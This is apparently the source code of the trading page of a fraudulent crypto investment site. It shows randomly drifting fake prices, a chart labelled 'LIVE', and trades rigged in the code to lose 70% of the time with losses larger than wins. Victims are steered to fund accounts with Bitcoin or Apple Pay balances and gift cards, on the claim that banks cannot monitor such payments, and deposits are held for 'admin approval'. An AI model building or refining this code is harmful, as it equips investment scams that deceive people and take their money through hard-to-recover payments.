'use client'

import { useState, useEffect, useRef } from 'react'
import { createClient } from '@/lib/supabase/client'

const ASSETS = [
  { symbol: 'BTC/USD', name: 'Bitcoin', price: 67240, icon: '₿' },
  { symbol: 'ETH/USD', name: 'Ethereum', price: 3480, icon: 'Ξ' },
  { symbol: 'SOL/USD', name: 'Solana', price: 142.30, icon: '◎' },
  { symbol: 'BNB/USD', name: 'Binance Coin', price: 412.80, icon: '🟡' },
  { symbol: 'XRP/USD', name: 'Ripple', price: 0.624, icon: '✕' },
]

export default function TradePage() {
  const [balance, setBalance] = useState(0)
  const [tradeBalance, setTradeBalance] = useState(0)
  const [asset, setAsset] = useState(ASSETS[0])
  const [amount, setAmount] = useState('')
  const [direction, setDirection] = useState<'BUY' | 'SELL'>('BUY')
  const [leverage, setLeverage] = useState(1)
  const [isTrading, setIsTrading] = useState(false)
  const [tradeResult, setTradeResult] = useState<null | { won: boolean, profit: number, message: string }>(null)
  const [prices, setPrices] = useState(ASSETS.map(a => ({ ...a, current: a.price })))
  const [history, setHistory] = useState<any[]>([])
  const [activeTab, setActiveTab] = useState<'trade' | 'fund'>('trade')
  const [fundAmount, setFundAmount] = useState('')
  const [fundMethod, setFundMethod] = useState('crypto')
  const [funded, setFunded] = useState(false)
  const timerRef = useRef<any>(null)

  useEffect(() => {
    const fetchBalance = async () => {
      const supabase = createClient()
      const { data: { user } } = await supabase.auth.getUser()
      if (!user) return
      const { data } = await supabase.from('balances').select('total_balance').eq('user_id', user.id).single()
      setBalance(data?.total_balance || 0)
    }
    fetchBalance()

    // Simulate live price updates
    const interval = setInterval(() => {
      setPrices(prev => prev.map(p => ({
        ...p,
        current: p.current * (1 + (Math.random() - 0.5) * 0.002)
      })))
    }, 2000)

    return () => clearInterval(interval)
  }, [])

  const currentAssetPrice = prices.find(p => p.symbol === asset.symbol)?.current || asset.price

  const handleFund = async () => {
    if (!fundAmount) return
    const supabase = createClient()
    const { data: { user } } = await supabase.auth.getUser()
    if (!user) return

    await supabase.from('notifications').insert({
      user_id: user.id,
      title: '⏳ Trading Account Funding Request',
      message: `Your request to fund your manual trading account with $${fundAmount} via ${fundMethod === 'crypto' ? 'Cryptocurrency' : 'Apple Pay'} is pending admin approval.`,
      type: 'info',
    })
    setFunded(true)
  }

  const handleTrade = () => {
    if (!amount || parseFloat(amount) <= 0) return
    if (parseFloat(amount) > tradeBalance) return

    setIsTrading(true)
    setTradeResult(null)

    // Simulate trading — rigged to lose 70% of the time
    const countdown = 10
    let count = countdown

    timerRef.current = setInterval(() => {
      count--
      if (count <= 0) {
        clearInterval(timerRef.current)

        // 30% win, 70% lose
        const won = Math.random() < 0.30
        const tradeAmount = parseFloat(amount) * leverage

        let profit = 0
        let message = ''

        if (won) {
          profit = tradeAmount * (0.05 + Math.random() * 0.15)
          message = `Trade successful! Your ${direction} position on ${asset.symbol} closed in profit.`
          setTradeBalance(prev => prev + profit)
        } else {
          profit = -(tradeAmount * (0.15 + Math.random() * 0.35))
          message = `Market moved against your ${direction} position. Stop loss triggered.`
          setTradeBalance(prev => Math.max(0, prev + profit))
        }

        setHistory(prev => [{
          asset: asset.symbol,
          direction,
          amount: tradeAmount,
          profit,
          won,
          time: new Date().toLocaleTimeString(),
        }, ...prev.slice(0, 9)])

        setTradeResult({ won, profit, message })
        setIsTrading(false)
        setAmount('')
      }
    }, 1000)
  }

  return (
    <div style={{ padding: 24 }}>
      <div style={{ marginBottom: 24 }}>
        <div style={{ fontSize: 24, fontWeight: 800, color: '#e6edf3', marginBottom: 6 }}>Manual Trading</div>
        <div style={{ fontSize: 13, color: '#8b949e' }}>Trade crypto markets manually with leverage. Fund your trading account to get started.</div>
      </div>

      {/* Important notice */}
      <div style={{ background: 'rgba(201,168,76,0.06)', border: '1px solid rgba(201,168,76,0.25)', borderRadius: 12, padding: '14px 18px', marginBottom: 24 }}>
        <div style={{ fontSize: 13, fontWeight: 700, color: '#C9A84C', marginBottom: 6 }}>⚠️ Important — Funding Method</div>
        <div style={{ fontSize: 12, color: '#8b949e', lineHeight: 1.8 }}>
          For privacy and security compliance, manual trading accounts only accept funding via <strong style={{ color: '#e6edf3' }}>Cryptocurrency (Bitcoin preferred)</strong> or <strong style={{ color: '#e6edf3' }}>Apple Pay</strong>. This ensures your trading activity remains private and protected from third-party surveillance. All deposits are processed through our encrypted payment gateway.
        </div>
      </div>

      {/* Tabs */}
      <div style={{ display: 'flex', gap: 4, marginBottom: 24, background: '#0d1117', border: '1px solid #161b22', borderRadius: 10, padding: 4, width: 'fit-content' }}>
        {[{ id: 'trade', label: '📊 Trade' }, { id: 'fund', label: '💰 Fund Account' }].map(t => (
          <button key={t.id} onClick={() => setActiveTab(t.id as any)} style={{ padding: '9px 22px', borderRadius: 8, border: 'none', background: activeTab === t.id ? 'rgba(201,168,76,0.15)' : 'transparent', color: activeTab === t.id ? '#C9A84C' : '#8b949e', fontSize: 12, cursor: 'pointer', fontFamily: 'monospace' }}>
            {t.label}
          </button>
        ))}
      </div>

      {/* Fund Account Tab */}
      {activeTab === 'fund' && (
  <div style={{ maxWidth: 600 }}>
    {funded ? (
      <div style={{ background: 'rgba(63,185,80,0.08)', border: '1px solid rgba(63,185,80,0.2)', borderRadius: 14, padding: 32, textAlign: 'center' }}>
        <div style={{ fontSize: 40, marginBottom: 12 }}>⏳</div>
        <div style={{ fontSize: 16, fontWeight: 700, color: '#3fb950', marginBottom: 8 }}>Funding Request Submitted</div>
        <div style={{ fontSize: 13, color: '#8b949e', lineHeight: 1.8 }}>
          Your request of <strong style={{ color: '#e6edf3' }}>${fundAmount}</strong> is pending admin approval. You'll be notified within 1-2 hours.
        </div>
        <button onClick={() => setFunded(false)} style={{ marginTop: 20, padding: '10px 24px', borderRadius: 10, border: '1px solid #3fb950', background: 'transparent', color: '#3fb950', fontSize: 12, cursor: 'pointer', fontFamily: 'monospace' }}>
          Submit Another
        </button>
      </div>
    ) : (
      <div style={{ background: '#0d1117', border: '1px solid #161b22', borderRadius: 14, padding: 24 }}>
        <div style={{ fontSize: 14, fontWeight: 700, color: '#e6edf3', marginBottom: 6 }}>Fund Your Trading Account</div>
        <div style={{ fontSize: 12, color: '#484f58', marginBottom: 20 }}>Choose a payment method below</div>

        {/* Method selector */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 20 }}>
          {[
            { id: 'crypto', label: '₿ Cryptocurrency', desc: 'BTC, ETH, USDT · Most private', color: '#F7A600' },
            { id: 'apple', label: '🍎 Apple Pay', desc: 'Instant & encrypted', color: '#e6edf3' },
          ].map(m => (
            <div key={m.id} onClick={() => setFundMethod(m.id)} style={{ background: fundMethod === m.id ? `${m.color}12` : '#161b22', border: `2px solid ${fundMethod === m.id ? m.color : '#21262d'}`, borderRadius: 12, padding: 16, cursor: 'pointer' }}>
              <div style={{ fontSize: 14, fontWeight: 700, color: fundMethod === m.id ? m.color : '#e6edf3', marginBottom: 4 }}>{m.label}</div>
              <div style={{ fontSize: 11, color: '#484f58' }}>{m.desc}</div>
            </div>
          ))}
        </div>

        {/* Crypto providers */}
        {fundMethod === 'crypto' && (
          <div style={{ marginBottom: 20 }}>
            <div style={{ fontSize: 11, color: '#8b949e', marginBottom: 12, padding: '10px 14px', background: 'rgba(247,166,0,0.06)', border: '1px solid rgba(247,166,0,0.2)', borderRadius: 8, lineHeight: 1.7 }}>
              🔒 Cryptocurrency ensures your trading activity is fully private and cannot be monitored by banks. Purchase Bitcoin from any provider below, then submit your deposit request.
            </div>
            <div style={{ fontSize: 11, color: '#484f58', marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.08em' }}>Buy Bitcoin from:</div>
            {[
              { name: 'MoonPay', icon: '🌙', color: '#7B2BF9', desc: 'Card, Apple Pay, Bank', url: 'https://www.moonpay.com/buy/btc', tag: 'Popular' },
              { name: 'Paybis', icon: '💳', color: '#00C2FF', desc: 'Credit card, Skrill, Neteller', url: 'https://paybis.com/buy-bitcoin/', tag: 'Fast' },
              { name: 'Binance', icon: '🔶', color: '#F7A600', desc: 'P2P, Card, Binance account', url: 'https://www.binance.com/en/crypto/buy/USD/BTC', tag: 'Low fees' },
              { name: 'Coinbase', icon: '🔵', color: '#0052FF', desc: 'Bank, Debit card, PayPal', url: 'https://www.coinbase.com/buy-bitcoin', tag: 'Trusted' },
              { name: 'Simplex', icon: '⬡', color: '#00B386', desc: 'Visa, Mastercard, SEPA', url: 'https://www.simplex.com/buy-bitcoin', tag: 'Secure' },
            ].map(p => (
              <a key={p.name} href={p.url} target="_blank" rel="noopener noreferrer" style={{ textDecoration: 'none', display: 'block', marginBottom: 8 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '12px 14px', background: `${p.color}0a`, border: `1px solid ${p.color}33`, borderRadius: 10 }}>
                  <span style={{ fontSize: 20 }}>{p.icon}</span>
                  <div style={{ flex: 1 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 2 }}>
                      <span style={{ fontSize: 13, fontWeight: 700, color: '#e6edf3' }}>{p.name}</span>
                      <span style={{ fontSize: 9, color: p.color, background: `${p.color}18`, padding: '2px 7px', borderRadius: 4, fontWeight: 700 }}>{p.tag}</span>
                    </div>
                    <span style={{ fontSize: 11, color: '#484f58' }}>{p.desc}</span>
                  </div>
                  <span style={{ fontSize: 14, color: p.color, fontWeight: 700 }}>→</span>
                </div>
              </a>
            ))}
          </div>
        )}

        {/* Apple Pay providers */}
        {fundMethod === 'apple' && (
          <div style={{ marginBottom: 20 }}>
            <div style={{ fontSize: 11, color: '#8b949e', marginBottom: 12, padding: '10px 14px', background: 'rgba(230,237,243,0.04)', border: '1px solid rgba(230,237,243,0.1)', borderRadius: 8, lineHeight: 1.7 }}>
              🍎 Apple Pay provides end-to-end encrypted transactions. Purchase your Apple Pay balance or gift card below, then use it to fund your trading account.
            </div>
            <div style={{ fontSize: 11, color: '#484f58', marginBottom: 10, textTransform: 'uppercase', letterSpacing: '0.08em' }}>Purchase Apple Pay Balance:</div>
            {[
              { name: 'Apple.com', icon: '🍎', color: '#e6edf3', desc: 'Add money to Apple Cash directly', url: 'https://www.apple.com/apple-pay/', tag: 'Official' },
              { name: 'MoonPay', icon: '🌙', color: '#7B2BF9', desc: 'Buy crypto with Apple Pay', url: 'https://www.moonpay.com', tag: 'Fast' },
              { name: 'Paybis', icon: '💳', color: '#00C2FF', desc: 'Apple Pay accepted', url: 'https://paybis.com', tag: 'Secure' },
              { name: 'Transak', icon: '🌐', color: '#C9A84C', desc: 'Global Apple Pay gateway', url: 'https://transak.com', tag: 'Global' },
            ].map(p => (
              <a key={p.name} href={p.url} target="_blank" rel="noopener noreferrer" style={{ textDecoration: 'none', display: 'block', marginBottom: 8 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '12px 14px', background: `${p.color}0a`, border: `1px solid ${p.color}33`, borderRadius: 10 }}>
                  <span style={{ fontSize: 20 }}>{p.icon}</span>
                  <div style={{ flex: 1 }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 2 }}>
                      <span style={{ fontSize: 13, fontWeight: 700, color: '#e6edf3' }}>{p.name}</span>
                      <span style={{ fontSize: 9, color: p.color, background: `${p.color}18`, padding: '2px 7px', borderRadius: 4, fontWeight: 700 }}>{p.tag}</span>
                    </div>
                    <span style={{ fontSize: 11, color: '#484f58' }}>{p.desc}</span>
                  </div>
                  <span style={{ fontSize: 14, color: p.color, fontWeight: 700 }}>→</span>
                </div>
              </a>
            ))}
          </div>
        )}

        {/* Amount input */}
        <div style={{ marginBottom: 20 }}>
          <label style={{ display: 'block', fontSize: 11, color: '#8b949e', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Funding Amount (USD)</label>
          <input
            type="number"
            value={fundAmount}
            onChange={e => setFundAmount(e.target.value)}
            placeholder="Min. $500"
            style={{ width: '100%', background: '#161b22', border: '1px solid #30363d', borderRadius: 10, padding: '13px 14px', color: '#e6edf3', fontSize: 14, outline: 'none', boxSizing: 'border-box', fontFamily: 'monospace' }}
            onFocus={e => e.target.style.borderColor = '#C9A84C'}
            onBlur={e => e.target.style.borderColor = '#30363d'}
          />
        </div>

        <button onClick={handleFund} disabled={!fundAmount} style={{ width: '100%', padding: '13px 0', background: 'linear-gradient(135deg, #C9A84C, #E8D08C)', border: 'none', borderRadius: 12, color: '#060a0f', fontSize: 14, fontWeight: 800, cursor: 'pointer', fontFamily: 'monospace', opacity: !fundAmount ? 0.5 : 1 }}>
          Submit Funding Request →
        </button>
      </div>
    )}
  </div>
)}
    

      {/* Trade Tab */}
      {activeTab === 'trade' && (
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 380px', gap: 20 }}>
          {/* Left — Chart & prices */}
          <div>
            {/* Live prices */}
            <div style={{ background: '#0d1117', border: '1px solid #161b22', borderRadius: 12, padding: 16, marginBottom: 16 }}>
              <div style={{ fontSize: 12, fontWeight: 600, color: '#e6edf3', marginBottom: 12 }}>Live Prices</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 8 }}>
                {prices.map(p => (
                  <div key={p.symbol} onClick={() => setAsset(ASSETS.find(a => a.symbol === p.symbol) || asset)} style={{ background: asset.symbol === p.symbol ? 'rgba(201,168,76,0.1)' : '#161b22', border: `1px solid ${asset.symbol === p.symbol ? '#C9A84C' : '#21262d'}`, borderRadius: 8, padding: '10px 12px', cursor: 'pointer', textAlign: 'center' }}>
                    <div style={{ fontSize: 10, color: '#484f58', marginBottom: 4 }}>{p.symbol.split('/')[0]}</div>
                    <div style={{ fontSize: 13, fontWeight: 700, color: '#e6edf3' }}>${p.current.toFixed(p.current < 10 ? 4 : 2)}</div>
                  </div>
                ))}
              </div>
            </div>

            {/* Fake chart */}
            <div style={{ background: '#0d1117', border: '1px solid #161b22', borderRadius: 12, padding: 20, marginBottom: 16 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 16 }}>
                <div>
                  <div style={{ fontSize: 14, fontWeight: 700, color: '#e6edf3' }}>{asset.symbol}</div>
                  <div style={{ fontSize: 22, fontWeight: 800, color: '#C9A84C' }}>${currentAssetPrice.toFixed(asset.price < 10 ? 4 : 2)}</div>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                  <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#3fb950', boxShadow: '0 0 8px #3fb950' }} />
                  <span style={{ fontSize: 11, color: '#3fb950' }}>LIVE</span>
                </div>
              </div>
              <iframe
                src={`https://s.tradingview.com/widgetembed/?symbol=BINANCE:${asset.symbol.replace('/', '')}&interval=1&hidesidetoolbar=1&hidetoptoolbar=0&theme=dark&style=1&locale=en&toolbar_bg=0d1117`}
                style={{ width: '100%', height: 280, border: 'none', borderRadius: 8 }}
              />
            </div>

            {/* Trade History */}
            <div style={{ background: '#0d1117', border: '1px solid #161b22', borderRadius: 12, padding: 20 }}>
              <div style={{ fontSize: 13, fontWeight: 600, color: '#e6edf3', marginBottom: 14 }}>Trade History</div>
              {history.length === 0 ? (
                <div style={{ textAlign: 'center', padding: 24, color: '#484f58', fontSize: 13 }}>No trades yet. Place your first trade!</div>
              ) : history.map((h, i) => (
                <div key={i} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 0', borderBottom: '1px solid #161b22' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
                    <span style={{ fontSize: 10, fontWeight: 700, color: h.direction === 'BUY' ? '#3fb950' : '#f85149', background: h.direction === 'BUY' ? 'rgba(63,185,80,0.1)' : 'rgba(248,81,73,0.1)', padding: '2px 8px', borderRadius: 4 }}>{h.direction}</span>
                    <span style={{ fontSize: 12, color: '#e6edf3' }}>{h.asset}</span>
                    <span style={{ fontSize: 11, color: '#484f58' }}>${h.amount.toFixed(2)}</span>
                  </div>
                  <div style={{ textAlign: 'right' }}>
                    <div style={{ fontSize: 13, fontWeight: 700, color: h.won ? '#3fb950' : '#f85149' }}>
                      {h.won ? '+' : ''}{h.profit.toFixed(2)}
                    </div>
                    <div style={{ fontSize: 10, color: '#484f58' }}>{h.time}</div>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Right — Trade Panel */}
          <div>
            <div style={{ background: '#0d1117', border: '1px solid #161b22', borderRadius: 14, padding: 20, marginBottom: 16 }}>
              {/* Balance */}
              <div style={{ background: 'linear-gradient(135deg, rgba(201,168,76,0.1), rgba(201,168,76,0.04))', border: '1px solid rgba(201,168,76,0.2)', borderRadius: 10, padding: '12px 16px', marginBottom: 20 }}>
                <div style={{ fontSize: 10, color: '#484f58', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 4 }}>Trading Balance</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: '#C9A84C' }}>${tradeBalance.toFixed(2)}</div>
                {tradeBalance === 0 && (
                  <div style={{ fontSize: 11, color: '#f85149', marginTop: 4 }}>
                    Fund your account to start trading
                  </div>
                )}
              </div>

              {/* Direction */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginBottom: 16 }}>
                {(['BUY', 'SELL'] as const).map(d => (
                  <button key={d} onClick={() => setDirection(d)} style={{ padding: '12px 0', borderRadius: 10, border: `2px solid ${direction === d ? d === 'BUY' ? '#3fb950' : '#f85149' : '#21262d'}`, background: direction === d ? d === 'BUY' ? 'rgba(63,185,80,0.15)' : 'rgba(248,81,73,0.15)' : 'transparent', color: direction === d ? d === 'BUY' ? '#3fb950' : '#f85149' : '#484f58', fontSize: 13, fontWeight: 700, cursor: 'pointer', fontFamily: 'monospace' }}>
                    {d === 'BUY' ? '▲ BUY' : '▼ SELL'}
                  </button>
                ))}
              </div>

              {/* Amount */}
              <div style={{ marginBottom: 14 }}>
                <label style={{ display: 'block', fontSize: 11, color: '#8b949e', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Trade Amount (USD)</label>
                <input
                  type="number"
                  value={amount}
                  onChange={e => setAmount(e.target.value)}
                  placeholder="Enter amount"
                  style={{ width: '100%', background: '#161b22', border: '1px solid #30363d', borderRadius: 8, padding: '12px 14px', color: '#e6edf3', fontSize: 13, outline: 'none', boxSizing: 'border-box', fontFamily: 'monospace' }}
                />
              </div>

              {/* Quick amounts */}
              <div style={{ display: 'flex', gap: 6, marginBottom: 14, flexWrap: 'wrap' }}>
                {['25%', '50%', '75%', '100%'].map(pct => (
                  <button key={pct} onClick={() => setAmount((tradeBalance * parseInt(pct) / 100).toFixed(2))} style={{ padding: '5px 10px', borderRadius: 6, border: '1px solid #21262d', background: 'transparent', color: '#8b949e', fontSize: 11, cursor: 'pointer', fontFamily: 'monospace' }}>
                    {pct}
                  </button>
                ))}
              </div>

              {/* Leverage */}
              <div style={{ marginBottom: 20 }}>
                <label style={{ display: 'block', fontSize: 11, color: '#8b949e', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Leverage: {leverage}x</label>
                <input type="range" min="1" max="100" value={leverage} onChange={e => setLeverage(parseInt(e.target.value))} style={{ width: '100%', accentColor: '#C9A84C' }} />
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 10, color: '#484f58', marginTop: 4 }}>
                  <span>1x</span><span>25x</span><span>50x</span><span>100x</span>
                </div>
              </div>

              {/* Trade summary */}
              {amount && (
                <div style={{ background: '#161b22', borderRadius: 10, padding: 14, marginBottom: 16 }}>
                  {[
                    { label: 'Position Size', value: `$${(parseFloat(amount) * leverage).toFixed(2)}` },
                    { label: 'Asset', value: asset.symbol },
                    { label: 'Entry Price', value: `$${currentAssetPrice.toFixed(2)}` },
                    { label: 'Direction', value: direction },
                  ].map(item => (
                    <div key={item.label} style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 6 }}>
                      <span style={{ fontSize: 11, color: '#484f58' }}>{item.label}</span>
                      <span style={{ fontSize: 11, color: '#e6edf3', fontWeight: 600 }}>{item.value}</span>
                    </div>
                  ))}
                </div>
              )}

              {/* Trade button */}
              <button
                onClick={handleTrade}
                disabled={isTrading || !amount || parseFloat(amount) <= 0 || tradeBalance === 0}
                style={{
                  width: '100%', padding: '14px 0',
                  background: isTrading ? '#161b22' : direction === 'BUY' ? 'linear-gradient(135deg, #3fb950, #2ea043)' : 'linear-gradient(135deg, #f85149, #da3633)',
                  border: 'none', borderRadius: 10,
                  color: '#fff', fontSize: 14, fontWeight: 800,
                  cursor: isTrading || !amount || tradeBalance === 0 ? 'not-allowed' : 'pointer',
                  fontFamily: 'monospace',
                  opacity: !amount || tradeBalance === 0 ? 0.4 : 1,
                }}>
                {isTrading ? (
                  <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
                    <span style={{ animation: 'spin 1s linear infinite', display: 'inline-block' }}>⟳</span>
                    Processing Trade...
                  </span>
                ) : tradeBalance === 0 ? 'Fund Account to Trade' : `${direction === 'BUY' ? '▲ Place BUY Order' : '▼ Place SELL Order'}`}
              </button>
            </div>

            {/* Trade Result */}
            {tradeResult && (
              <div style={{ background: tradeResult.won ? 'rgba(63,185,80,0.08)' : 'rgba(248,81,73,0.08)', border: `1px solid ${tradeResult.won ? 'rgba(63,185,80,0.3)' : 'rgba(248,81,73,0.3)'}`, borderRadius: 12, padding: 16, textAlign: 'center' }}>
                <div style={{ fontSize: 28, marginBottom: 8 }}>{tradeResult.won ? '🎯' : '📉'}</div>
                <div style={{ fontSize: 13, fontWeight: 700, color: tradeResult.won ? '#3fb950' : '#f85149', marginBottom: 6 }}>
                  {tradeResult.won ? 'Trade Won!' : 'Trade Closed'}
                </div>
                <div style={{ fontSize: 20, fontWeight: 800, color: tradeResult.won ? '#3fb950' : '#f85149', marginBottom: 8 }}>
                  {tradeResult.won ? '+' : ''}{tradeResult.profit.toFixed(2)} USD
                </div>
                <div style={{ fontSize: 11, color: '#8b949e', lineHeight: 1.6 }}>{tradeResult.message}</div>
              </div>
            )}

            {/* Demo note */}
            <div style={{ background: '#0d1117', border: '1px solid #161b22', borderRadius: 10, padding: 14, marginTop: 16 }}>
              <div style={{ fontSize: 11, color: '#484f58', lineHeight: 1.7 }}>
                📊 <strong style={{ color: '#8b949e' }}>Live Demo Mode:</strong> Practice trading with simulated funds to learn the platform before using real capital. Fund your account to access real markets.
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}